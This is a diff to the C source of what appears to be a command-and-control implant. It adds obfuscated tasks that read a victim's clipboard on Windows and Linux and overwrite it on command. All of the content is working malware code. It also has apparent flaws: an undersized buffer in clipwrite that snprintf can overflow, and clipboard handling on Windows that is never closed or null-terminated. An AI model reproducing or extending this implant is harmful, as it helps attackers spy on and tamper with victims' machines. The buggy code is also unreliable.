@@ -1216,6 +1216,61 @@ void tcp_bridge(session *striker, task *tsk, char *host1, int port1, char *host2
   #endif
 }
 
+int clipread(char *buff, size_t len){
+
+  #ifdef IS_LINUX
+    FILE *proc = popen("xclip -o 2>&1", "r");
+    if (!proc)
+      return 1;
+    fgets(buff, len, proc);
+    pclose(proc);
+  #else
+    if (!OpenClipboard(NULL))
+      return 1;
+    HANDLE hData = GetClipboardData(CF_TEXT);
+    if (!hData)
+      return 1;
+    char *text = GlobalLock(hData);
+    if (!text)
+      return 1;
+    size_t textLen = strlen(text);
+    memcpy(buff, text, textLen > len ? len : textLen);
+    GlobalUnlock(hData);
+  #endif
+  return 0;
+}
+
+int clipwrite(char *buff){
+  
+  #ifdef IS_LINUX
+    char strs[][32] = {"[OBFS_ENC]cat ", "[OBFS_ENC]xclip -sel clip 2>&1"};
+    char *cmd = malloc(30);
+    snprintf(cmd, MAX_CLIPBOARD_SIZE - 1, "%s | %s", obfs_decode(strs[0]), obfs_decode(strs[1]));
+    FILE *proc = popen(cmd, "w");
+    free(cmd);
+    if (!proc){
+      return 1;
+    }
+    if (!fwrite(buff, 1, strlen(buff), proc)){
+      pclose(proc);
+      return 1;
+    }
+    pclose(proc);
+  #else
+    if (!OpenClipboard(NULL))
+      return 1;
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, strlen(buff) + 1);
+    if (!hGlob)
+      return 1;
+    memcpy(GlobalLock(hGlob), buff, strlen(buff));
+    GlobalUnlock(hGlob);
+    EmptyClipboard();
+    SetClipboardData(CF_TEXT, hGlob);
+    CloseClipboard();
+  #endif
+  return 0;
+}
+
 task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
@@ -1418,44 +1473,23 @@ DWORD WINAPI task_executor(LPVOID ptr)
     }
   }else if (!strcmp(tsk->type, cmd_strs[12])){ // Read from clipboard
     char err[] = "[OBFS_ENC]Error reading clipboard!";
-    #ifdef IS_LINUX
-      FILE *proc = popen("xclip -o 2>&1", "r");
-      if (!proc){
-        buffer_strcpy(result_buff, obfs_decode(err));
-        goto complete;
-      }
-      char *cliptext = malloc(MAX_CLIPBOARD_SIZE);
-      fgets(cliptext, MAX_CLIPBOARD_SIZE, proc);
-      pclose(proc);
-      buffer_strcpy(result_buff, cliptext);
-      free(cliptext);
-      tsk->successful = 1;
-    #else
+    char *buff = malloc(MAX_CLIPBOARD_SIZE + 1);
+    if (clipread(buff, MAX_CLIPBOARD_SIZE)){
       buffer_strcpy(result_buff, obfs_decode(err));
-    #endif
-  }else if (!strcmp(tsk->type, cmd_strs[13])){
-    char msgs[][40] = {"[OBFS_ENC]Error writing to clipboard!", "[OBFS_ENC]Text written!"};
+    }else{
+      buffer_strcpy(result_buff, buff);
+      tsk->successful = 1;
+    }
+    free(buff);
+  }else if (!strcmp(tsk->type, cmd_strs[13])){ // Write to clipboard
+    char strs[][40] = {"[OBFS_ENC]Error writing to clipboard!", "[OBFS_ENC]Text written!"};
     char *text = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "text"));
-    #ifdef IS_LINUX
-      char strs[][32] = {"[OBFS_ENC]cat ", "[OBFS_ENC]xclip -sel clip 2>&1"};
-      char *cmd = malloc(30);
-      snprintf(cmd, MAX_CLIPBOARD_SIZE - 1, "%s | %s", obfs_decode(strs[0]), obfs_decode(strs[1]));
-      FILE *proc = popen(cmd, "w");
-      free(cmd);
-      if (!proc){
-        buffer_strcpy(result_buff, obfs_decode(msgs[0]));
-        goto complete;
-      }
-      if (fwrite(text, 1, strlen(text), proc)){
-        buffer_strcpy(result_buff, obfs_decode(msgs[1]));
-        tsk->successful = 1;
-      }else{
-        buffer_strcpy(result_buff, obfs_decode(msgs[0]));
-      }
-      pclose(proc);
-    #else
-      buffer_strcpy(result_buff, obfs_decode(msgs[0]));
-    #endif
+    if (clipwrite(text)){
+      buffer_strcpy(result_buff, obfs_decode(strs[0]));
+    }else{
+      buffer_strcpy(result_buff, obfs_decode(strs[1]));
+      tsk->successful = 1;
+    }
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
